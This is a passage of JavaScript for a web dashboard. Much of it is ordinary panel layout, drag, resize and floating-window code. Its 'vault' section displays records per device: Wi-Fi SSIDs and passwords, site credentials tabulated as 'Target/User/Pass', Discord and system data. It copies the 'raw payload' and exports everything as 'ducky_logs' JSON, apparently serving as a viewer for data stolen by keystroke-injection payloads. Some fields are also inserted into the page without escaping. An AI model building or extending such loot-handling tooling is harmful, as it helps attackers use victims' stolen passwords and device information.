        slot.addEventListener('dragleave', () => slot.classList.remove('drag-over'));
        
        slot.addEventListener('drop', (e) => {
            e.preventDefault();
            slot.classList.remove('drag-over');
            
            if (draggedPanel) {
                const targetPanel = slot.querySelector('.drag-panel');
                const sourceSlot = draggedPanel.parentElement;
                
                if (targetPanel && sourceSlot !== slot) {
                    sourceSlot.appendChild(targetPanel);
                    slot.appendChild(draggedPanel);
                } else if (!targetPanel && sourceSlot !== slot) {
                    slot.appendChild(draggedPanel); 
                }
            }
        });
    });
}

function initResizers() {
    setupResizer('rz-v1', 'col-left', 'col-mid', true);
    setupResizer('rz-v2', 'col-mid', 'col-right', true);
    setupResizer('rz-h-left', 'slot-1', 'slot-live', false);
    setupResizer('rz-h1', 'slot-2', 'slot-3', false);
    setupResizer('rz-h-right', 'slot-4', 'slot-fs', false);
}

function setupResizer(resizerId, prevId, nextId, isVertical) {
    const resizer = document.getElementById(resizerId);
    if(!resizer) return; 
    
    const prev = document.getElementById(prevId);
    const next = document.getElementById(nextId);
    
    resizer.addEventListener('mousedown', (e) => {
        e.preventDefault(); 
        resizer.classList.add('active');
        document.body.classList.add('resizing-active'); 

        prev.style.transition = 'none'; next.style.transition = 'none';

        const startPos = isVertical ? e.clientX : e.clientY;
        const parentSize = isVertical ? resizer.parentElement.offsetWidth : resizer.parentElement.offsetHeight;
        
        const prevStartBasis = (prev[isVertical ? 'offsetWidth' : 'offsetHeight'] / parentSize) * 100;
        const nextStartBasis = (next[isVertical ? 'offsetWidth' : 'offsetHeight'] / parentSize) * 100;

        const onMouseMove = (moveEvent) => {
            const delta = isVertical ? moveEvent.clientX - startPos : moveEvent.clientY - startPos;
            const deltaPercent = (delta / parentSize) * 100;
            let newPrev = prevStartBasis + deltaPercent; 
            let newNext = nextStartBasis - deltaPercent;
            
            if (newPrev > 15 && newNext > 15) {
                prev.style.flexBasis = `${newPrev}%`; next.style.flexBasis = `${newNext}%`;
                if (isVertical) { prev.style.width = `${newPrev}%`; next.style.width = `${newNext}%`; } 
                else { prev.style.height = `${newPrev}%`; next.style.height = `${newNext}%`; }
            }
        };

        const onMouseUp = () => {
            resizer.classList.remove('active'); document.body.classList.remove('resizing-active');
            prev.style.transition = ''; next.style.transition = '';
            document.removeEventListener('mousemove', onMouseMove, true);
            document.removeEventListener('mouseup', onMouseUp, true);
        };
        
        document.addEventListener('mousemove', onMouseMove, true);
        document.addEventListener('mouseup', onMouseUp, true);
    });
}

window.toggleMinimize = function(btn, panelId) {
    const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
    const panel = document.getElementById(panelId);
    if(!panel || panel.classList.contains('maximized')) return;

    if (panel.dataset.minimized === 'true') {
        panel.dataset.minimized = 'false';
        buttonEl.innerHTML = '<i class="fa-solid fa-minus"></i>';
        panel.classList.remove('collapsed');
    } else {
        panel.dataset.minimized = 'true';
        buttonEl.innerHTML = '<i class="fa-solid fa-window-restore"></i>';
        panel.classList.add('collapsed');
    }
};

window.toggleMaximize = function(btn, panelId) {
    const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
    const panel = document.getElementById(panelId);
    if(!panel) return;
    
    if (panel.classList.contains('maximized')) {
        panel.classList.remove('maximized');
        buttonEl.innerHTML = '<i class="fa-solid fa-expand"></i>';
    } else {
        if(panel.dataset.minimized === 'true') toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, panelId);
        bringToFrontFloat(panel);
        panel.classList.add('maximized');
        buttonEl.innerHTML = '<i class="fa-solid fa-compress"></i>';
    }
};

window.resetLayout = function() {
    floatingStates = {}; 
    if (isFloatingMode) toggleFloatingMode();
    
    const cols = ['col-left', 'col-mid', 'col-right'];
    const bases = ['25%', '50%', '25%'];
    cols.forEach((id, i) => { const el = document.getElementById(id); if(el) { el.style.flexBasis = bases[i]; el.style.width = bases[i]; } });
    
    const slots = ['slot-1', 'slot-live', 'slot-2', 'slot-3', 'slot-4', 'slot-fs'];
    slots.forEach(id => { const el = document.getElementById(id); if(el) { el.style.flexBasis = '50%'; el.style.height = '50%'; } });
    
    document.querySelectorAll('.drag-panel').forEach(p => { p.classList.remove('maximized', 'collapsed'); p.dataset.minimized = 'false'; });
    document.querySelectorAll('.draggable-header button .fa-window-restore').forEach(i => i.className = "fa-solid fa-minus");
    document.querySelectorAll('.draggable-header button .fa-compress').forEach(i => i.className = "fa-solid fa-expand");
    showToast('Layout Reset', 'success');
};

// ==========================================
// FLOATING WINDOW MANAGER
// ==========================================
window.toggleFloatingMode = function() {
    const btn = document.getElementById('btn-floating-toggle');
    const workspace = document.getElementById('workspace');
    const panels = document.querySelectorAll('.drag-panel');
    const wsRect = workspace.getBoundingClientRect();

    if (!isFloatingMode) {
        isFloatingMode = true;
        btn.innerHTML = '<i class="fa-solid fa-clone mr-1"></i> Float: ON';
        btn.classList.add('border-neon', 'text-white');
        btn.classList.remove('border-gray-700', 'text-gray-300');
        
        workspace.classList.add('floating-active'); 

        panels.forEach(p => {
            const rect = p.getBoundingClientRect();
            const startLeft = rect.left - wsRect.left;
            const startTop = rect.top - wsRect.top;
            const startWidth = rect.width;
            const startHeight = rect.height;

            p.classList.add('floating-panel');
            p.style.left = startLeft + 'px'; p.style.top = startTop + 'px';
            p.style.width = startWidth + 'px'; p.style.height = startHeight + 'px';
            
            if (!p.querySelector('.resize-handle')) {
                const handle = document.createElement('div'); handle.className = 'resize-handle'; p.appendChild(handle);
            }

            const saved = floatingStates[p.id];
            if (saved && !p.classList.contains('maximized')) {
                p.offsetHeight; p.classList.add('gliding'); 
                p.style.left = saved.left; p.style.top = saved.top;
                p.style.width = saved.width; p.style.height = saved.height; p.style.zIndex = saved.zIndex;
                setTimeout(() => p.classList.remove('gliding'), 400); 
            } else { p.style.zIndex = ++floatZIndex; }

            const header = p.querySelector('.draggable-header');
            if (header) header.setAttribute('draggable', 'false');
        });
        showToast('Free Floating Mode Enabled', 'success');
    } else {
        isFloatingMode = false;
        btn.innerHTML = '<i class="fa-solid fa-clone mr-1"></i> Float: OFF';
        btn.classList.remove('border-neon', 'text-white'); btn.classList.add('border-gray-700', 'text-gray-300');

        const firstRects = new Map();
        panels.forEach(p => {
            const rect = p.getBoundingClientRect();
            firstRects.set(p, { left: rect.left - wsRect.left, top: rect.top - wsRect.top, width: rect.width, height: rect.height });
            if (!p.classList.contains('maximized')) floatingStates[p.id] = { left: p.style.left, top: p.style.top, width: p.style.width, height: p.style.height, zIndex: p.style.zIndex };
        });

        workspace.classList.remove('floating-active');
        panels.forEach(p => {
            p.classList.remove('floating-panel');
            p.style.left = ''; p.style.top = ''; p.style.width = ''; p.style.height = ''; p.style.zIndex = '';
            const handle = p.querySelector('.resize-handle'); if (handle) handle.remove();
        });

        const lastRects = new Map();
        panels.forEach(p => {
            const rect = p.getBoundingClientRect();
            lastRects.set(p, { left: rect.left - wsRect.left, top: rect.top - wsRect.top, width: rect.width, height: rect.height });
        });

        workspace.classList.add('floating-active');
        panels.forEach(p => {
            const first = firstRects.get(p); p.classList.add('floating-panel');
            p.style.left = first.left + 'px'; p.style.top = first.top + 'px';
            p.style.width = first.width + 'px'; p.style.height = first.height + 'px';
        });

        panels.forEach(p => {
            p.offsetHeight; p.classList.add('gliding');
            const last = lastRects.get(p);
            p.style.left = last.left + 'px'; p.style.top = last.top + 'px';
            p.style.width = last.width + 'px'; p.style.height = last.height + 'px';
        });

        setTimeout(() => {
            workspace.classList.remove('floating-active');
            panels.forEach(p => {
                p.classList.remove('gliding', 'floating-panel');
                p.style.left = ''; p.style.top = ''; p.style.width = ''; p.style.height = '';
                const header = p.querySelector('.draggable-header');
                if (header) header.setAttribute('draggable', 'true');
            });
            if (leafletMap) leafletMap.invalidateSize(true);
        }, 400);
        showToast('Grid Tiling Layout Restored', 'success');
    }
};

function initFloatingWindowManager() {
    document.addEventListener('mousedown', (e) => {
        if (!isFloatingMode) return;
        const resizeHandle = e.target.closest('.resize-handle');
        const header = e.target.closest('.draggable-header');
        
        if (resizeHandle) {
            const panel = resizeHandle.closest('.drag-panel');
            if (panel.classList.contains('maximized') || panel.classList.contains('collapsed')) return;
            isResizingFloat = true; activeFloatPanel = panel; bringToFrontFloat(activeFloatPanel);
            floatStartX = e.clientX; floatStartY = e.clientY;
            const rect = activeFloatPanel.getBoundingClientRect();
            panelStartWidth = rect.width; panelStartHeight = rect.height; e.preventDefault();
        } else if (header && !e.target.closest('button') && !e.target.closest('select') && !e.target.closest('input')) {
            const panel = header.closest('.drag-panel');
            if (panel.classList.contains('maximized')) return;
            isDraggingFloat = true; activeFloatPanel = panel; bringToFrontFloat(activeFloatPanel);
            floatStartX = e.clientX; floatStartY = e.clientY;
            panelStartLeft = parseFloat(activeFloatPanel.style.left) || 0; panelStartTop = parseFloat(activeFloatPanel.style.top) || 0; e.preventDefault();
        }
    });

    document.addEventListener('mousemove', (e) => {
        if (!isFloatingMode || !activeFloatPanel) return;
        if (isDraggingFloat) {
            const dx = e.clientX - floatStartX; const dy = e.clientY - floatStartY;
            activeFloatPanel.style.left = `${panelStartLeft + dx}px`; activeFloatPanel.style.top = `${panelStartTop + dy}px`;
        } else if (isResizingFloat) {
            const dx = e.clientX - floatStartX; const dy = e.clientY - floatStartY;
            activeFloatPanel.style.width = `${Math.max(250, panelStartWidth + dx)}px`; activeFloatPanel.style.height = `${Math.max(150, panelStartHeight + dy)}px`;
        }
    });

    document.addEventListener('mouseup', () => {
        if (isDraggingFloat || isResizingFloat) { isDraggingFloat = false; isResizingFloat = false; activeFloatPanel = null; }
    });
}

function bringToFrontFloat(panel) { if(!isFloatingMode) return; panel.style.zIndex = ++floatZIndex; }

// ==========================================
// VAULT CARD RENDERING
// ==========================================
function buildFilters() {
    const container = document.getElementById('filterContainer');
    container.innerHTML = '';
    container.classList.remove('hidden');

    const categories = [...new Set(globalData.map(item => item.category))];
    container.appendChild(createFilterBtn('All', true));
    categories.forEach(cat => container.appendChild(createFilterBtn(cat, false)));
}

function createFilterBtn(text, isActive) {
    const btn = document.createElement('button');
    const activeClasses = 'bg-cyberBlue/20 text-cyberBlue font-bold border-cyberBlue shadow-[0_0_10px_rgba(0,210,211,0.2)]';
    const inactiveClasses = 'bg-[#0f1423] text-gray-400 border-gray-700 hover:text-white hover:border-gray-500';
    
    btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${isActive ? activeClasses : inactiveClasses}`;
    btn.innerText = text;
    
    btn.onclick = () => {
        document.querySelectorAll('.filter-btn').forEach(b => b.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${inactiveClasses}`);
        btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${activeClasses}`;
        
        if (text === 'All') renderCards(globalData, document.getElementById('output'));
        else renderCards(globalData.filter(item => item.category === text), document.getElementById('output'));
    };
    return btn;
}

function renderCards(data, outputDiv) {
    outputDiv.innerHTML = '';
    
    data.forEach((item, index) => {
        let icon = 'fa-file-code'; let color = 'text-neon';
        
        if(item.category.includes('Wi-Fi')) { icon = 'fa-wifi'; color = 'text-blue-400'; }
        if(item.category.includes('System')) { icon = 'fa-server'; color = 'text-green-400'; }
        if(item.category.includes('Password') || item.category.includes('Cred')) { icon = 'fa-key'; color = 'text-yellow-400'; }
        if(item.category.includes('Discord')) { icon = 'fa-discord'; color = 'text-indigo-400'; }

        const panelId = `vault-panel-${index}`;
        const htmlContent = parseToHTML(item.category, item.content);
        
        const slot = document.createElement('div');
        slot.className = "drag-slot fade-in h-[400px]"; 
        slot.style.animationDelay = `${index * 0.05}s`;
        
        slot.innerHTML = `
            <div id="${panelId}" class="drag-panel" data-minimized="false">
                <div class="draggable-header px-4 py-3 border-b border-gray-800 flex justify-between items-center bg-[#050810] rounded-t-[0.75rem]" draggable="true">
                    <div class="flex items-center gap-2 pointer-events-none">
                        <i class="fa-solid ${icon} ${color}"></i>
                        <h3 class="font-bold text-gray-200 text-xs uppercase tracking-widest">${item.category}</h3>
                    </div>
                    <div class="flex gap-2">
                        <button onclick="toggleMinimize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 flex items-center justify-center text-[8px]"><i class="fa-solid fa-minus"></i></button>
                        <button onclick="toggleMaximize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 flex items-center justify-center text-[8px]"><i class="fa-solid fa-expand"></i></button>
                    </div>
                </div>
                <div class="win-content flex flex-col bg-[#0f1423] rounded-b-[0.75rem] h-full relative">
                    <div class="absolute top-2 right-2 z-10 flex gap-2">
                        <span class="text-[10px] font-mono text-gray-500 bg-black/60 px-2 py-1 rounded">${new Date(item.created_at).toLocaleDateString()}</span>
                        <button onclick="copyData(this)" class="bg-gray-800 hover:bg-gray-700 text-white rounded px-2 py-1 transition-colors text-[10px]" title="Copy Raw"><i class="fa-regular fa-copy"></i></button>
                    </div>
                    <div class="p-0 flex-grow overflow-y-auto mt-6">
                        <textarea class="hidden-raw-data hidden">${item.content}</textarea>
                        ${htmlContent}
                    </div>
                </div>
            </div>
        `;
        outputDiv.appendChild(slot);
    });
    initDragAndDrop(); 
}

function parseToHTML(category, content) {
    let defaultRaw = `<pre class="p-4 font-mono text-xs text-cyberBlue whitespace-pre-wrap break-all">${escapeHtml(content)}</pre>`;
    try {
        if (category.includes('Wi-Fi')) {
            const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
            let rows = blocks.map(block => {
                let ssid = (block.match(/SSID:\s*(.*)/i) || [])[1] || 'Unknown';
                let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
                return `<tr class="border-b border-gray-800/50 hover:bg-white/5"><td class="px-4 py-2.5 text-blue-400 font-bold w-1/2 break-all">${escapeHtml(ssid)}</td><td class="px-4 py-2.5 font-mono text-white blur-reveal rounded w-1/2 break-all">${escapeHtml(pass)}</td></tr>`;
            }).join('');
            if (rows) return `<table class="w-full text-left text-xs table-fixed"><thead class="bg-[#050810] text-gray-500"><tr><th class="p-2 pl-4 w-1/2">Network (SSID)</th><th class="p-2 w-1/2">Password</th></tr></thead><tbody>${rows}</tbody></table>`;
        }
        
        if (category.includes('Password') || category.includes('Cred')) {
            const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
            let rows = blocks.map(block => {
                let url = (block.match(/(?:URL|HOST):\s*(.*)/i) || [])[1] || 'N/A';
                let user = (block.match(/USER:\s*(.*)/i) || [])[1] || 'N/A';
                let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
                return `<tr class="border-b border-gray-800/50 hover:bg-white/5"><td class="p-2 pl-3 text-yellow-400 truncate w-1/3" title="${escapeHtml(url)}">${escapeHtml(url)}</td><td class="p-2 text-gray-300 truncate w-1/3">${escapeHtml(user)}</td><td class="p-2 font-mono text-white blur-reveal rounded w-1/3 truncate">${escapeHtml(pass)}</td></tr>`;
            }).join('');
            if (rows) return `<table class="w-full text-left text-xs table-fixed"><thead class="bg-[#050810] text-gray-500"><tr><th class="p-2 pl-3 w-1/3">Target</th><th class="p-2 w-1/3">User</th><th class="p-2 w-1/3">Pass</th></tr></thead><tbody>${rows}</tbody></table>`;
        }
        
        if (category.includes('System')) {
            const lines = content.split('\n').filter(l => l.trim().length > 0);
            let gridItems = lines.map(line => {
                let parts = line.includes(':') ? line.split(':') : line.split('=');
                if (parts.length >= 2) {
                    let key = parts.shift().trim(); let val = parts.join(':').trim();
                    return `<div class="bg-[#050810] p-2.5 rounded border border-gray-800/80"><div class="text-gray-500 text-[9px] font-bold uppercase tracking-wider mb-0.5">${escapeHtml(key)}</div><div class="text-green-400 font-mono text-[11px] truncate">${escapeHtml(val)}</div></div>`;
                } 
                return '';
            }).join('');
            if (gridItems) return `<div class="p-3 grid grid-cols-2 gap-2">${gridItems}</div>`;
        }
    } catch (e) { return defaultRaw; }
    return defaultRaw;
}

function escapeHtml(unsafe) { 
    return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}

window.copyData = function(btnElement) {
    const dataToCopy = btnElement.closest('.drag-panel').querySelector('.hidden-raw-data').value;
    navigator.clipboard.writeText(dataToCopy).then(() => {
        showToast("Raw payload copied to clipboard");
        const icon = btnElement.querySelector('i');
        icon.className = "fa-solid fa-check text-green-400";
        setTimeout(() => { icon.className = "fa-regular fa-copy"; }, 2000);
    });
};

window.exportLogs = function() {
    if (globalData.length === 0) return showToast("No data to export.", "error");
    
    const deviceId = document.getElementById('deviceId').value.trim() || 'export';
    const jsonData = JSON.stringify(globalData, null, 2);
    const blob = new Blob([jsonData], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a'); a.href = url; a.download = `ducky_logs_${deviceId}.json`;
    document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
    showToast("Logs exported.");
};
